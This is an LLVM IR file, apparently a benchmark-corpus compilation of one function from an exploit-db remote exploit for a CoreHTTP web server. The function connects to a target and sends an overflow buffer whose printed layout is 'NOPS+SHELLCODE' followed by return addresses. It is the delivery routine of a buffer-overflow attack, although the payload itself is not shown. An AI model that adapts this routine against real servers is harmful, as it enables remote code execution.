; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4243.c_corehttp_connect.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4243.c_corehttp_connect.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"[*] attempting to connect: %s:%d.\0A\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"couldn't resolve hostname.\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [34 x i8] c"corehttp/httpd connection failed.\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"[*] successfully connected: %s:%d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"[*] sending string:\0A\00", align 1
@.str.5 = private unnamed_addr constant [61 x i8] c"[+]  \22X [NOPS+SHELLCODEx512]|[ADDR1x16][ADDR2x256]\\r\\n\\r\\n\22\0A\00", align 1
@tbl = common dso_local global %struct.TYPE_4__ zeroinitializer, align 4
@BUFSIZE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [26 x i8] c"[*] closing connection.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local zeroext i16 @corehttp_connect(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  %8 = load i32, i32* @AF_INET, align 4
  %9 = load i32, i32* @SOCK_STREAM, align 4
  %10 = load i32, i32* @IPPROTO_TCP, align 4
  %11 = call i32 @socket(i32 %8, i32 %9, i32 %10)
  store i32 %11, i32* %5, align 4
  %12 = load i32, i32* @AF_INET, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %12, i32* %13, align 4
  %14 = load i16, i16* %4, align 2
  %15 = call i32 @htons(i16 zeroext %14)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %15, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = load i16, i16* %4, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i8* %17, i32 %19)
  %21 = load i8*, i8** %3, align 8
  %22 = call i32 @inet_addr(i8* %21)
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %24 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %23, i32 0, i32 0
  store i32 %22, i32* %24, align 4
  %25 = icmp ne i32 %22, 0
  br i1 %25, label %26, label %40

26:                                               ; preds = %2
  %27 = load i8*, i8** %3, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %6, align 8
  %29 = icmp ne %struct.hostent* %28, null
  br i1 %29, label %32, label %30

30:                                               ; preds = %26
  %31 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %32

32:                                               ; preds = %30, %26
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %34 = bitcast %struct.TYPE_3__* %33 to i8*
  %35 = load %struct.hostent*, %struct.hostent** %6, align 8
  %36 = getelementptr inbounds %struct.hostent, %struct.hostent* %35, i32 0, i32 0
  %37 = load i64, i64* %36, align 8
  %38 = inttoptr i64 %37 to i8*
  %39 = call i32 @memcpy(i8* %34, i8* %38, i32 4)
  br label %40

40:                                               ; preds = %32, %2
  %41 = load i32, i32* @SIGALRM, align 4
  %42 = load i32, i32* @sig_alarm, align 4
  %43 = call i32 @signal(i32 %41, i32 %42)
  %44 = load i32, i32* @TIMEOUT, align 4
  %45 = call i32 @alarm(i32 %44)
  %46 = load i32, i32* %5, align 4
  %47 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %48 = call i64 @connect(i32 %46, %struct.sockaddr* %47, i32 12)
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %52

50:                                               ; preds = %40
  %51 = call i32 @printe(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %52

52:                                               ; preds = %50, %40
  %53 = call i32 @alarm(i32 0)
  %54 = load i8*, i8** %3, align 8
  %55 = load i16, i16* %4, align 2
  %56 = zext i16 %55 to i32
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0), i8* %54, i32 %56)
  %58 = call i32 @sleep(i32 1)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.5, i64 0, i64 0))
  %61 = load i32, i32* %5, align 4
  %62 = load i32, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tbl, i32 0, i32 0), align 4
  %63 = call i32 @getbuf(i32 %62)
  %64 = load i32, i32* @BUFSIZE, align 4
  %65 = call i32 @write(i32 %61, i32 %63, i32 %64)
  %66 = call i32 @sleep(i32 1)
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0))
  %68 = load i32, i32* %5, align 4
  %69 = call i32 @close(i32 %68)
  ret i16 0
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @getbuf(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
